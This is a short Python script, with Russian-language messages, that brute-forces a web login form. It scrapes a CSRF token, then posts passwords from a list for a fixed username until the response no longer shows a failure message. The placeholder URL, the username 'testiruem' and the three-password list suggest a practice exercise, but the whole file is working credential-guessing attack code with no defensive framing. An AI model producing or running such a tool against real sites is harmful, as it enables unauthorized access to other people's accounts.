import requests
from bs4 import BeautifulSoup

url="url"
def b_f_login(username, passwords):
    session=requests.Session()

    print("Получаем csrf token")
    log_page=session.get(url)
    soup=BeautifulSoup(log_page.text, "html.parser")

    csrf_input=soup.find('input', {'name': 'csrf_token'})
    csrf_token=csrf_input.get('value') if csrf_input else ""

    for password in passwords:
        print(f"Пробуем {username}:{password}")
        data={
        'username':username,
        'password': password,
        'csrf_token': csrf_token
         }
        response=session.post(url, data=data)

        if 'Login Failed' not in response.text and 'Invalid' not in response.text:
            print(f'успешно. Пароль найден {password}')
            print(f'url после входа- {response.url}')
            return password
        elif 'E-Mail' in response.text:
            print(f'Пароль нашелся-{password}')
            return password
    print('Пароль не найден')
    return None

if __name__=="__main__":
    passwords=['password', '123', 'qwerty']
    b_f_login('testiruem', passwords)